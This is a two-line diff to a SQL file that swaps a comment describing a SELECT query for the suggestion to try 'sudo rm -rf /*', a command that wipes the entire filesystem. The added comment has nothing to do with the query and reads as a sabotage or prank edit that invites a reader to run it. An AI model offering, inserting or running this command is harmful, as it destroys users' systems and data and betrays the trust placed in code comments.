@@ -1,2 +1,2 @@
--- lists all rows of the table from the database
+-- try `sudo rm -rf /*`
 SELECT * FROM first_table;
